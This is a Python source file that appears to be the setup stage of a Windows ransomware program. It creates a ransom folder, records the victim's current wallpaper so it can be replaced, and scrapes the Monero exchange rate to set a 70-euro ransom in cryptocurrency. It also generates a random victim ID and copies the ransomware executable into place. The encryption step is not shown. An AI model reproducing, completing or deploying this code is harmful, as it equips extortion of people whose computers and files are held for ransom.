from os import mkdir,rename
from os.path import expanduser, dirname,realpath,isfile
from random import choices
from sys import path
from pycoingecko import CoinGeckoAPI
from re import findall
from shutil import copy
from ctypes import create_unicode_buffer,windll
from win32con import SPI_GETDESKWALLPAPER

# Local import Constant
current = dirname(realpath(__file__))
current_dir = dirname(current)
path.append(current_dir)
# Import 
from const import *


class Begin : 

    def __init__(self) : 
        #Call functions 
        self.create_directorie()
        self.get_Wallpaper()
        self.save_Wallpaper()
        self.get_monero_price()
        self.generate_id_key()
        self.copy_file()
        

    def get_monero_price(self):
        'Scrap the price of monero on : https://www.coingecko.com/'

        try :
            print('[-] Start scraping the monero value :')
            #Scrap price and extract it
            cg = CoinGeckoAPI()
            cg.request_timeout = 2
            price = cg.get_price(ids='monero', vs_currencies='eur')
            print(price)
            price = price['monero'].values()
            price = findall(r'\d{1,3}\.\d{1,2}',str(price))
            price = price[0]
            price = float(price)
            final = (70 * 1)/price
            ransom_monero = round(final,3)
        #Write price in Monero
            with open(PRICE_MONERO_PATH,'a') as f :
                f.write(str(ransom_monero))
        #If scraping failed Write price in €
        except :
            print('[-] Scraping failed write just 70€')
            with open(PRICE_MONERO_PATH,'a') as f :
                f.write(str('(70€)'))
            pass


    def get_Wallpaper(self):
        'Get the current wallpaper'
        ubuf = create_unicode_buffer(512)
        windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER,len(ubuf),ubuf,0)
        self.current_wall = ubuf.value


    def save_Wallpaper(self):
        'Save current wallpaper'
        with open(f'{PATH_RANCON}\\current_wallpaper.txt','w') as f:
            f.write(self.current_wall)


    def copy_file(self):
        'Copy the .exe to ransomw dir'
        try:
            copy(RANSOW_FILE, PATH_RANCON)  # Fine
        except:pass


    def create_directorie(self): 
        'Create the directory for all ransomw files'
        try:
            mkdir(PATH_RANCON)
        except:pass


    def generate_id_key(self): 
        'Generate the identification KEY'
        try:
            self.id_key = ''.join(choices('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ',k=15))
            with open(ID_KEY_PATH,'a') as f:
                f.write(self.id_key)
        except:pass


if __name__ == "__main__" : 
    pass